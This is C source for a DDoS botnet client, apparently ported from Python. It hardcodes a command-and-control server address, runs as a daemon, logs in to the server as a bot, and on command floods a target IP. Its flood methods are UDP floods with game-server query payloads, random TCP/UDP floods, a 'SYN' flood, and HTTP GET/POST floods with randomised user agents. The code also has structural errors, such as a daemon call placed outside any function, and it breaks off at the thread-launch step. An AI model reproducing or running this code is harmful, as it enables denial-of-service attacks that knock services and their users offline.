#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <sys/time.h>
#include <fcntl.h>
#include <errno.h>
#include <ctype.h>

// Configuration
#define C2_ADDRESS "134.255.216.46"
#define C2_PORT 600

// Payloads
unsigned char payload_fivem[] = {0xff, 0xff, 0xff, 0xff, 'g', 'e', 't', 'i', 'n', 'f', 'o', ' ', 'x', 'x', 'x', 0x00, 0x00, 0x00};
unsigned char payload_vse[] = {0xff, 0xff, 0xff, 0xff, 0x54, 0x53, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x20, 0x45, 0x6e, 0x67, 0x69, 0x6e, 0x65, 0x20, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00};
unsigned char payload_mcpe[] = {0x61, 0x74, 0x6f, 0x6d, 0x20, 0x64, 0x61, 0x74, 0x61, 0x20, 0x6f, 0x6e, 0x74, 0x6f, 0x70, 0x20, 0x6d, 0x79, 0x20, 0x6f, 0x77, 0x6e, 0x20, 0x61, 0x73, 0x73, 0x20, 0x61, 0x6d, 0x70, 0x2f, 0x74, 0x72, 0x69, 0x70, 0x68, 0x65, 0x6e, 0x74, 0x20, 0x69, 0x73, 0x20, 0x6d, 0x79, 0x20, 0x64, 0x69, 0x63, 0x6b, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x62, 0x61, 0x6c, 0x6c, 0x73};
unsigned char payload_hex[] = {0x55, 0x55, 0x55, 0x55, 0x00, 0x00, 0x00, 0x01};

const int PACKET_SIZES[] = {512, 1024, 2048};
const int NUM_PACKET_SIZES = sizeof(PACKET_SIZES) / sizeof(PACKET_SIZES[0]);

// User Agents
const char* base_user_agents[] = {
    "Mozilla/%.1f (Windows; U; Windows NT %.1f; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f",
    "Mozilla/%.1f (Windows; U; Windows NT %.1f; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f",
    "Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f",
    "Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f",
    "Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
};
const int NUM_USER_AGENTS = sizeof(base_user_agents) / sizeof(base_user_agents[0]);
#define MAX_UA_LEN 512 // Max length for generated user agent string

// Global file descriptor for /dev/urandom
int urandom_fd = -1;

// Helper function to get current time in milliseconds
long long get_current_time_ms() {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return (long long)tv.tv_sec * 1000 + tv.tv_usec / 1000;
}

// Helper function to initialize /dev/urandom
void init_random_bytes() {
    urandom_fd = open("/dev/urandom", O_RDONLY);
    if (urandom_fd < 0) {
        // Replicate Python's potential failure by exiting or handling.
        // Given the use in attacks, failing to get random bytes is critical.
        perror("Failed to open /dev/urandom");
        exit(1); // Exit on failure to open urandom
    }
}

// Helper function to get random bytes
void get_random_bytes(unsigned char* buffer, size_t size) {
    if (urandom_fd < 0) {
        // Should not happen if init_random_bytes is called
        fprintf(stderr, "Error: /dev/urandom not initialized.\n");
        exit(1); // Exit if urandom not initialized
    }
    ssize_t bytes_read = read(urandom_fd, buffer, size);
    if (bytes_read < size) {
        // Replicate Python's potential failure by exiting or handling.
        perror("Failed to read from /dev/urandom");
        exit(1); // Exit on failure to read urandom
    }
}

// Helper function to generate a random user agent string
void generate_random_ua(char* buffer, size_t buffer_size) {
    int format_index = rand() % NUM_USER_AGENTS;
    const char* chosen_format = base_user_agents[format_index];

    // Generate random numbers needed for the formats
    float rf[8]; // Max floats needed across formats
    int ri[4];   // Max ints needed across formats
    for(int i=0; i<8; ++i) rf[i] = (float)rand() / RAND_MAX * 10.0; // 0.0 to 10.0
    for(int i=0; i<4; ++i) ri[i] = rand() % 10; // 0 to 9

    // Use snprintf for safety
    switch(format_index) {
        case 0: snprintf(buffer, buffer_size, chosen_format, rf[0], rf[1], rf[2], rf[3], ri[0], ri[1], rf[4], rf[5]); break;
        case 1: snprintf(buffer, buffer_size, chosen_format, rf[0], rf[1], rf[2], rf[3], ri[0], ri[1], rf[4], rf[5]); break;
        case 2: snprintf(buffer, buffer_size, chosen_format, rf[0], rf[1], rf[2], ri[0], ri[1], rf[3], rf[4]); break;
        case 3: snprintf(buffer, buffer_size, chosen_format, rf[0], rf[1], rf[2], ri[0], ri[1], rf[3], rf[4]); break;
        case 4: snprintf(buffer, buffer_size, chosen_format, rf[0], rf[1], rf[2], ri[0], ri[1], rf[3], rf[4]); break;
        case 5:
        case 6:
        case 7:
        case 8: snprintf(buffer, buffer_size, chosen_format); break; // These formats have no % specifiers
        default: snprintf(buffer, buffer_size, "UnknownUserAgent"); break; // Should not happen
    }
}

// Helper function to convert hex string to byte array
void hex_to_bytes(const char* hex_string, unsigned char* byte_array, size_t* byte_array_len) {
    size_t len = strlen(hex_string);
    *byte_array_len = len / 2;
    for (size_t i = 0; i < len; i += 2) {
        sscanf(hex_string + i, "%2hhx", &byte_array[i / 2]);
    }
}


// Attack methods (forward declarations)
void attack_fivem(const char* ip, int port, long long end_time_ms);
void attack_mcpe(const char* ip, int port, long long end_time_ms);
void attack_vse(const char* ip, int port, long long end_time_ms);
void attack_hex(const char* ip, int port, long long end_time_ms);
void attack_udp_bypass(const char* ip, int port, long long end_time_ms);
void attack_tcp_bypass(const char* ip, int port, long long end_time_ms);
void attack_tcp_udp_bypass(const char* ip, int port, long long end_time_ms);
void attack_syn(const char* ip, int port, long long end_time_ms);
void attack_http_get(const char* ip, int port, long long end_time_ms);
void attack_http_post(const char* ip, int port, long long end_time_ms);
void attack_browser(const char* ip, int port, long long end_time_ms);

// Struct for thread arguments
struct AttackArgs {
    void (*attack_func)(const char*, int, long long); // Function pointer
    char ip[INET_ADDRSTRLEN]; // Max IPv4 string length
    int port;
    long long end_time_ms;
};

// Thread function
void* attack_thread_func(void* arg) {
    struct AttackArgs* args = (struct AttackArgs*)arg;
    // Call the attack function
    args->attack_func(args->ip, args->port, args->end_time_ms);
    // Free the allocated arguments
    free(args);
    return NULL;
}

// Attack methods mapping
struct AttackMethod {
    const char* name;
    void (*func)(const char*, int, long long);
};

struct AttackMethod attack_methods[] = {
    {".HEX", attack_hex},
    {".UDP", attack_udp_bypass},
    {".TCP", attack_tcp_bypass},
    {".MIX", attack_tcp_udp_bypass},
    {".SYN", attack_syn},
    {".VSE", attack_vse},
    {".MCPE", attack_mcpe},
    {".FIVEM", attack_fivem},
    {".HTTPGET", attack_http_get},
    {".HTTPPOST", attack_http_post},
    {".BROWSER", attack_browser},
};
const int NUM_ATTACK_METHODS = sizeof(attack_methods) / sizeof(attack_methods[0]);


// Attack methods implementations

// UDP Attacks (socket created once before loop, errors in sendto break loop)
void attack_fivem(const char* ip, int port, long long end_time_ms) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) { /* Python's except: pass */ return; }

    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        close(s); /* Python's except: pass */ return;
    }

    while (get_current_time_ms() < end_time_ms) {
        if (sendto(s, payload_fivem, sizeof(payload_fivem), 0, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            /* Python's except catches sendto errors and breaks the loop */
            break;
        }
    }
    close(s);
}

void attack_mcpe(const char* ip, int port, long long end_time_ms) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) { /* Python's except: pass */ return; }

    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        close(s); /* Python's except: pass */ return;
    }

    while (get_current_time_ms() < end_time_ms) {
        if (sendto(s, payload_mcpe, sizeof(payload_mcpe), 0, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            /* Python's except catches sendto errors and breaks the loop */
            break;
        }
    }
    close(s);
}

void attack_vse(const char* ip, int port, long long end_time_ms) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) { /* Python's except: pass */ return; }

    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        close(s); /* Python's except: pass */ return;
    }

    while (get_current_time_ms() < end_time_ms) {
        if (sendto(s, payload_vse, sizeof(payload_vse), 0, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            /* Python's except catches sendto errors and breaks the loop */
            break;
        }
    }
    close(s);
}

void attack_hex(const char* ip, int port, long long end_time_ms) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) { /* Python's except: pass */ return; }

    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        close(s); /* Python's except: pass */ return;
    }

    while (get_current_time_ms() < end_time_ms) {
        if (sendto(s, payload_hex, sizeof(payload_hex), 0, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            /* Python's except catches sendto errors and breaks the loop */
            break;
        }
    }
    close(s);
}

void attack_udp_bypass(const char* ip, int port, long long end_time_ms) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) { /* Python's except: pass */ return; }

    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        close(sock); /* Python's except: pass */ return;
    }

    while (get_current_time_ms() < end_time_ms) {
        int packet_size = PACKET_SIZES[rand() % NUM_PACKET_SIZES];
        unsigned char* packet = malloc(packet_size);
        if (packet == NULL) {
            /* Python's except catches malloc errors and breaks the loop */
            break;
        }
        get_random_bytes(packet, packet_size);

        if (sendto(sock, packet, packet_size, 0, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            free(packet);
            /* Python's except catches sendto errors and breaks the loop */
            break;
        }
        free(packet);
    }
    close(sock);
}

// TCP Attacks (socket created inside loop, errors jump to cleanup and continue outer loop)
void attack_tcp_bypass(const char* ip, int port, long long end_time_ms) {
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        return; // Invalid IP
    }

    while (get_current_time_ms() < end_time_ms) { // Outer time loop
        int s = -1; // Socket descriptor
        unsigned char* packet = NULL; // Packet buffer

        // Python's try block starts here. Errors jump to `except: pass` (continue outer loop) and then `finally`.
        // In C, use goto for error handling and cleanup.

        int packet_size = PACKET_SIZES[rand() % NUM_PACKET_SIZES];
        packet = malloc(packet_size);
        if (packet == NULL) {
            /* Python's except catches malloc errors */
            goto cleanup_and_continue_tcp_bypass; // Jump to finally equivalent
        }
        get_random_bytes(packet, packet_size);

        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            /* Python's except catches socket errors */
            goto cleanup_and_continue_tcp_bypass;
        }

        if (connect(s, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            /* Python's except catches connect errors */
            goto cleanup_and_continue_tcp_bypass;
        }

        // Inner send loop (while time.time() < secs)
        while (get_current_time_ms() < end_time_ms) {
            if (send(s, packet, packet_size, 0) < 0) {
                /* Python's except catches send errors and breaks the inner loop */
                break; // Break inner send loop on send error
            }
        }

    cleanup_and_continue_tcp_bypass: // Equivalent of finally block + continue outer loop
        if (s >= 0) {
            close(s); // Ignore close errors like Python
        }
        if (packet != NULL) {
            free(packet); // Free packet
        }
        // Outer while loop continues automatically
    }
}

void attack_tcp_udp_bypass(const char* ip, int port, long long end_time_ms) {
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        return; // Invalid IP
    }

    while (get_current_time_ms() < end_time_ms) { // Outer time loop
        int s = -1; // Socket descriptor
        unsigned char* packet = NULL; // Packet buffer

        // Python's try block starts here. Errors jump to `except: pass` (continue outer loop) and then `finally`.
        // In C, use goto for error handling and cleanup.

        int packet_size = PACKET_SIZES[rand() % NUM_PACKET_SIZES];
        packet = malloc(packet_size);
        if (packet == NULL) {
            /* Python's except catches malloc errors */
            goto cleanup_and_continue_tcp_udp_bypass; // Jump to finally equivalent
        }
        get_random_bytes(packet, packet_size);

        if (rand() % 2 == 0) { // TCP
            s = socket(AF_INET, SOCK_STREAM, 0);
            if (s < 0) { /* Python's except catches socket errors */ goto cleanup_and_continue_tcp_udp_bypass; }
            if (connect(s, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) { /* Python's except catches connect errors */ goto cleanup_and_continue_tcp_udp_bypass; }
            if (send(s, packet, packet_size, 0) < 0) { /* Python's except catches send errors */ goto cleanup_and_continue_tcp_udp_bypass; }
        } else { // UDP
            s = socket(AF_INET, SOCK_DGRAM, 0);
            if (s < 0) { /* Python's except catches socket errors */ goto cleanup_and_continue_tcp_udp_bypass; }
            if (sendto(s, packet, packet_size, 0, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) { /* Python's except catches sendto errors */ goto cleanup_and_continue_tcp_udp_bypass; }
        }

    cleanup_and_continue_tcp_udp_bypass: // Equivalent of finally block + continue outer loop
        if (s >= 0) {
            close(s); // Ignore close errors like Python
        }
        if (packet != NULL) {
            free(packet); // Free packet
        }
        // Outer while loop continues automatically
    }
}

void attack_syn(const char* ip, int port, long long end_time_ms) {
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        return; // Invalid IP
    }

    int s = -1; // Socket descriptor

    // Python's try block starts here. Errors jump to `except: pass` (return).
    // In C, use goto for error handling and cleanup.

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) {
        /* Python's except catches socket errors */
        goto cleanup_syn; // Jump to cleanup and return
    }

    // Set non-blocking
    int flags = fcntl(s, F_GETFL, 0);
    if (flags < 0) {
        /* Python's except catches fcntl errors */
        goto cleanup_syn;
    }
    if (fcntl(s, F_SETFL, flags | O_NONBLOCK) < 0) {
        /* Python's except catches fcntl errors */
        goto cleanup_syn;
    }

    // Connect (non-blocking)
    int connect_res = connect(s, (struct sockaddr*)&target_addr, sizeof(target_addr));
    if (connect_res < 0 && errno != EINPROGRESS) {
        /* Python's except catches connect errors */
        goto cleanup_syn;
    }
    // Note: Python doesn't check for EINPROGRESS or wait. It just proceeds.
    // If connect is in progress, subsequent sends might fail with EAGAIN/EWOULDBLOCK.

    // Send loop (while time.time() < secs)
    while (get_current_time_ms() < end_time_ms) {
        unsigned char* packet = NULL; // Packet buffer
        int packet_size = PACKET_SIZES[rand() % NUM_PACKET_SIZES];

        packet = malloc(packet_size);
        if (packet == NULL) {
            /* Python's except catches malloc errors and breaks the loop */
            break; // Break time loop, then goto cleanup_syn
        }
        get_random_bytes(packet, packet_size);

        // Send (non-blocking)
        ssize_t sent_bytes = send(s, packet, packet_size, 0);
        free(packet); // Free packet after sending attempt

        if (sent_bytes < 0) {
            // Python's except catches send errors and breaks the loop.
            break; // Break time loop on send error
        }
        // If sent_bytes < packet_size, not all data was sent. Python's send doesn't guarantee all data sent in non-blocking.
        // Python's send returns number of bytes sent. If it's less than requested, it's not an exception unless it's 0 or -1.
        // The Python code doesn't loop on send to ensure all data is sent. It just calls send once per iteration.
        // Replicate this: call send once, check for -1, break loop on -1.
    }

cleanup_syn: // Equivalent of except: pass (return)
    if (s >= 0) {
        close(s); // Ignore close errors
    }
    // No packet buffer to free here, it's freed inside the loop.
}


void attack_http_get(const char* ip, int port, long long end_time_ms) {
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        return; // Invalid IP
    }

    while (get_current_time_ms() < end_time_ms) { // Outer time loop
        int s = -1; // Socket descriptor
        char request[MAX_UA_LEN + 256]; // Buffer for the request
        char user_agent[MAX_UA_LEN];

        // Python's try block starts here. Errors jump to `except: s.close()` (close socket) and continue outer loop.
        // In C, use goto for error handling and cleanup.

        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            /* Python's except catches socket errors */
            goto cleanup_and_continue_http_get;
        }

        if (connect(s, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            /* Python's except catches connect errors */
            goto cleanup_and_continue_http_get;
        }

        // Inner send loop (while time.time() < secs)
        while (get_current_time_ms() < end_time_ms) {
            generate_random_ua(user_agent, sizeof(user_agent));
            snprintf(request, sizeof(request),
                     "GET / HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Connection: keep-alive\r\n\r\n",
                     ip, user_agent);

            if (send(s, request, strlen(request), 0) < 0) {
                /* Python's except catches send errors and breaks the inner loop */
                break; // Break inner send loop on send error
            }
        }

    cleanup_and_continue_http_get: // Equivalent of except: s.close() + continue outer loop
        if (s >= 0) {
            close(s); // Ignore close errors like Python
        }
        // Outer while loop continues automatically
    }
}

void attack_http_post(const char* ip, int port, long long end_time_ms) {
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        return; // Invalid IP
    }

    const char* hex_payload_str = "757365726e616d653d61646d696e2670617373776f72643d70617373776f726431323326656d61696c3d61646d696e406578616d706c652e636f6d267375626d69743d6c6f67696e";
    unsigned char byte_payload[strlen(hex_payload_str) / 2];
    size_t byte_payload_len;
    hex_to_bytes(hex_payload_str, byte_payload, &byte_payload_len);

    while (get_current_time_ms() < end_time_ms) { // Outer time loop
        int s = -1; // Socket descriptor
        char request_headers[MAX_UA_LEN + 512]; // Buffer for headers
        char user_agent[MAX_UA_LEN];

        // Python's try block starts here. Errors jump to `except: s.close()` (close socket) and continue outer loop.
        // In C, use goto for error handling and cleanup.

        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            /* Python's except catches socket errors */
            goto cleanup_and_continue_http_post;
        }

        if (connect(s, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            /* Python's except catches connect errors */
            goto cleanup_and_continue_http_post;
        }

        // Inner send loop (while time.time() < secs)
        while (get_current_time_ms() < end_time_ms) {
            generate_random_ua(user_agent, sizeof(user_agent));
            snprintf(request_headers, sizeof(request_headers),
                     "POST / HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Content-Type: application/x-www-form-urlencoded\r\n"
                     "Content-Length: %zu\r\n" // Use %zu for size_t
                     "Connection: keep-alive\r\n\r\n",
                     ip, user_agent, byte_payload_len);

            // Send headers first
            if (send(s, request_headers, strlen(request_headers), 0) < 0) {
                 /* Python's except catches send errors and breaks the inner loop */
                 break; // Break inner send loop on send error
            }
            // Send payload bytes
            if (send(s, byte_payload, byte_payload_len, 0) < 0) {
                 /* Python's except catches send errors and breaks the inner loop */
                 break; // Break inner send loop on send error
            }
        }

    cleanup_and_continue_http_post: // Equivalent of except: s.close() + continue outer loop
        if (s >= 0) {
            close(s); // Ignore close errors like Python
        }
        // Outer while loop continues automatically
    }
}

void attack_browser(const char* ip, int port, long long end_time_ms) {
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target_addr.sin_addr) <= 0) {
        return; // Invalid IP
    }

    while (get_current_time_ms() < end_time_ms) { // Outer time loop
        int s = -1; // Socket descriptor
        char request[MAX_UA_LEN + 512]; // Buffer for the request
        char user_agent[MAX_UA_LEN];

        // Python's try block starts here. Errors jump to `except: pass` (continue outer loop) and then `finally`.
        // In C, use goto for error handling and cleanup.

        s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            /* Python's except catches socket errors */
            goto cleanup_and_continue_browser;
        }

        // Set timeout (5 seconds)
        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));

        if (connect(s, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
            /* Python's except catches connect errors */
            goto cleanup_and_continue_browser;
        }

        generate_random_ua(user_agent, sizeof(user_agent));
        snprintf(request, sizeof(request),
                 "GET / HTTP/1.1\r\n"
                 "Host: %s\r\n"
                 "User-Agent: %s\r\n"
                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                 "Accept-Encoding: gzip, deflate, br\r\n"
                 "Accept-Language: en-US,en;q=0.5\r\n"
                 "Connection: keep-alive\r\n"
                 "Upgrade-Insecure-Requests: 1\r\n"
                 "Cache-Control: max-age=0\r\n"
                 "Pragma: no-cache\r\n\r\n",
                 ip, user_agent);

        // Python uses sendall, which loops to send all data. C's send might not send all at once.
        // Replicate sendall behavior with a loop.
        size_t total_sent = 0;
        size_t request_len = strlen(request);
        while (total_sent < request_len) {
            ssize_t sent_now = send(s, request + total_sent, request_len - total_sent, 0);
            if (sent_now < 0) {
                /* Python's except catches send errors */
                goto cleanup_and_continue_browser; // Error during sendall loop jumps to except
            }
            total_sent += sent_now;
        }

        // Python's inner loop is just `s.send(packet)`. It doesn't loop on time *after* the first send.
        // The structure is: while time < secs: try: connect; while time < secs: send; except: pass; finally: close.
        // This means it connects, sends repeatedly until time is up or error, then closes, then repeats connect/send loop until time is up.
        // My current C structure for TCP attacks is correct then. The inner loop is the send loop.

    cleanup_and_continue_browser: // Equivalent of except: pass + finally
        if (s >= 0) {
            close(s); // Ignore close errors like Python
        }
        // Outer while loop continues automatically
    }
}


// Main function

int daemon_result = daemon(1, 0);
if (daemon_result < 0) {
    perror("daemon");
    exit(EXIT_FAILURE);
}

int main() {
    // Seed rand() for general randomness
    srand(time(NULL));
    // Initialize /dev/urandom for random bytes
    init_random_bytes();
    // Daemonize the process
    if (daemon(1, 0) < 0) {
        perror("daemon");
        exit(EXIT_FAILURE);

    // Python's top-level try/except: pass around main() is ignored in C.
    // The recursive main() call is replaced by the outer while(1) loop.

    while (1) { // Main infinite loop for reconnection attempts
        int c2_socket = -1;

        // Connection and Authentication Block
        // Python's first while True loop with try/except time.sleep(120)
        while (1) { // Connection/Auth attempt loop
            c2_socket = socket(AF_INET, SOCK_STREAM, 0);
            if (c2_socket < 0) {
                // perror("socket"); // Python does pass
                sleep(120);
                continue; // Retry connection loop
            }

            // Set SO_KEEPALIVE
            int enable_keepalive = 1;
            if (setsockopt(c2_socket, SOL_SOCKET, SO_KEEPALIVE, &enable_keepalive, sizeof(enable_keepalive)) < 0) {
                 // perror("setsockopt(SO_KEEPALIVE)"); // Python does pass
                 // Continue anyway, not a critical error based on Python logic
            }

            struct sockaddr_in server_addr;
            memset(&server_addr, 0, sizeof(server_addr));
            server_addr.sin_family = AF_INET;
            server_addr.sin_port = htons(C2_PORT);
            if (inet_pton(AF_INET, C2_ADDRESS, &server_addr.sin_addr) <= 0) {
                // fprintf(stderr, "Invalid C2 address: %s\n", C2_ADDRESS); // Python does pass
                close(c2_socket);
                sleep(120);
                continue; // Retry connection loop
            }

            if (connect(c2_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
                // perror("connect"); // Python does pass
                close(c2_socket);
                sleep(120);
                continue; // Retry connection loop
            }

            printf("connected!\n"); // Python prints 'connected!' after successful connect

            // Authentication
            char buffer[1024];
            int received;

            // Username auth: wait for 'Username', send 'BOT'
            while (1) {
                received = recv(c2_socket, buffer, sizeof(buffer) - 1, 0);
                if (received <= 0) break; // Error or disconnect
                buffer[received] = '\0';
                // Python uses 'Username' in data
                if (strstr(buffer, "Username") != NULL) {
                    if (send(c2_socket, "BOT", 3, 0) < 0) { /* Python except */ break; }
                    break; // Authentication step successful
                }
            }
            if (received <= 0) { // Error or disconnect during username auth
                // perror("recv/send during username auth"); // Python except
                close(c2_socket);
                sleep(120);
                continue; // Retry connection loop
            }

            // Password auth: wait for 'Password', send specific bytes
            while (1) {
                received = recv(c2_socket, buffer, sizeof(buffer) - 1, 0);
                if (received <= 0) break; // Error or disconnect
                buffer[received] = '\0';
                 // Python uses 'Password' in data
                if (strstr(buffer, "Password") != NULL) {
                    unsigned char password_payload[] = {0xFF, 0xFF, 0xFF, 0xFF, 0x75}; // Equivalent of b'\xff\xff\xff\xff\75'.encode('cp1252')
                    if (send(c2_socket, password_payload, sizeof(password_payload), 0) < 0) { /* Python except */ break; }
                    break; // Authentication step successful
                }
            }
            if (received <= 0) { // Error or disconnect during password auth
                // perror("recv/send during password auth"); // Python except
                close(c2_socket);
                sleep(120);
                continue; // Retry connection loop
            }

            // If we reached here, connection and auth successful
            break; // Break the connection/auth attempt loop
        }

        // Command Processing Block
        // Python's second while True loop with try/except break
        while (1) { // Command loop
            char buffer[1024];
            // Python uses recv(1024).decode().strip()
            int received = recv(c2_socket, buffer, sizeof(buffer) - 1, 0);
            if (received <= 0) { // Error or disconnect
                // perror("recv during command loop"); // Python except
                break; // Break command loop, equivalent to Python except: break or if not data: break
            }
            buffer[received] = '\0'; // Null-terminate the received data

            // Python uses .strip()
            // Find the end of the meaningful data (before newline or null)
            char* end = buffer + received - 1;
            while (end >= buffer && (*end == '\n' || *end == '\r' || isspace(*end) || *end == '\0')) {
                *end = '\0';
                end--;
            }
            // Now buffer is null-terminated and stripped

            // Python uses data.split(' ') and args[0].upper()
            char method_str[20], ip_str[INET_ADDRSTRLEN];
            int port, duration_secs, threads;

            // Use strtok_r for splitting like Python's split
            char* token;
            char* rest = buffer;
            char* args[6]; // Max 5 arguments + command
            int arg_count = 0;

            while ((token = strtok_r(rest, " ", &rest)) != NULL && arg_count < 6) {
                args[arg_count++] = token;
            }

            if (arg_count == 0) {
                 // Received empty line after strip? Python's if not data: break handles this.
                 // Our recv <= 0 handles disconnect. Empty line after strip is unlikely to cause strtok error,
                 // but if it does, the except: break handles it.
                 // If arg_count is 0, it's not a valid command. Python's except would catch index error.
                 // fprintf(stderr, "Received empty command.\n"); // Python except
                 break; // Break command loop
            }

            char command[20];
            strncpy(command, args[0], sizeof(command) - 1);
            command[sizeof(command) - 1] = '\0';
            // Python uses .upper()
            for(int i = 0; command[i]; i++){
              command[i] = toupper(command[i]);
            }

            if (strcmp(command, "PING") == 0) {
                if (send(c2_socket, "PONG", 4, 0) < 0) { /* Python except */ break; }
            } else {
                // Attack command: METHOD IP PORT SECONDS THREADS
                if (arg_count != 5) {
                    // fprintf(stderr, "Invalid attack command format: %s\n", buffer); // Python except
                    break; // Break command loop
                }

                // Extract arguments
                strncpy(method_str, args[0], sizeof(method_str) - 1);
                method_str[sizeof(method_str) - 1] = '\0';
                // Python uses args[0].upper() for method lookup
                for(int i = 0; method_str[i]; i++){
                  method_str[i] = toupper(method_str[i]);
                }

                strncpy(ip_str, args[1], sizeof(ip_str) - 1);
                ip_str[sizeof(ip_str) - 1] = '\0';

                port = atoi(args[2]); // Python uses int(), errors caught by except
                duration_secs = atoi(args[3]); // Python uses int(), errors caught by except
                threads = atoi(args[4]); // Python uses int(), errors caught by except

                // Basic validation for atoi results (0 can be valid port, but not duration/threads)
                if (duration_secs <= 0 || threads <= 0) {
                     // fprintf(stderr, "Invalid duration or threads: %s\n", buffer); // Python except
                     break; // Break command loop
                }
                 // Port 0 is reserved, but technically valid for bind. Unlikely for target.
                 // Let's allow port 0 as Python's int() would.

                // Find attack method function pointer
                void (*attack_func)(const char*, int, long long) = NULL;
                for (int i = 0; i < NUM_ATTACK_METHODS; ++i) {
                    if (strcmp(method_str, attack_methods[i].name) == 0) {
                        attack_func = attack_methods[i].func;
                        break;
                    }
                }

                if (attack_func == NULL) {
                    // fprintf(stderr, "Unknown attack method: %s\n", method_str); // Python except
                    break; // Break command loop
                }

                // Calculate end time
                long long current_time_ms = get_current_time_ms();
                long long end_time_ms = current_time_ms + (long long)duration_secs * 1000;

                // Launch threads
